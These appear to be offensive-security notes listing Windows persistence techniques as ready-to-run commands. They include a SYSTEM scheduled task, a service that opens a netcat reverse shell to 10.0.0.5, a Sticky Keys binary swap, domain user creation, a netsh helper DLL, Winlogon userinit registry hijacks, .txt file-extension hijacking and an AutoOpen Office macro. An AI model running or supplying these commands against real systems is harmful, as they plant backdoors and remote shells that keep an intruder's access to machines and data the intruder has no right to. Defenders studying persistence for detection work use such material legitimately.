- `schtasks /create /sc minute /mo 1 /tn "eviltask" /tr C:\tools\shell.cmd /ru "SYSTEM"` command can be used to schedule a command to get executed every duration of time or interval of time.The issue is that all processes under this command are spawned with the parent process as `taskeng.exe`.

- Create an evil service with:

```
C:\> sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
[SC] CreateService SUCCESS
C:\> sc start evilsvc
```

- We can use the invoking of Sticky Keys as the triggering mechanism as we will change the path of the binary from `sethc.exe` to our malicious binary path.

- We can create new users and use them for storing our payloads. `net user test test123 /add /domain`.

- We can use the AddMonitor() technique for persistence.

- Just use this command `.\netsh.exe add helper C:\tools\NetshHelperBeacon.dll` after having the dll on the system.

- Registry keys:

```
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
```
- Just replace the HKCU to HKLM inside these registry keys and we will get system wide persistence.

- Or just add our malware to the init process launches -> `reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f`

- Extension hijacking;
    - `Computer\HKEY_CLASSES_ROOT\txtfile\shell\open\command` is the registry key having the %1 written after it so that the notepad.exe will open the file with the name %1 or the file which is double clicked at that moment.
    - But if we change it to the `<malicious file> %1` then our malicious file will also get executed alongwith the .txt file and it will thus open our file.

- We can add this AutoOpen() VBA function inside any word or office document to get the VBA code executed everytime I use any template or open the document.

```
Sub AutoOpen()
MsgBox "Ohai from the template"
End Sub
```

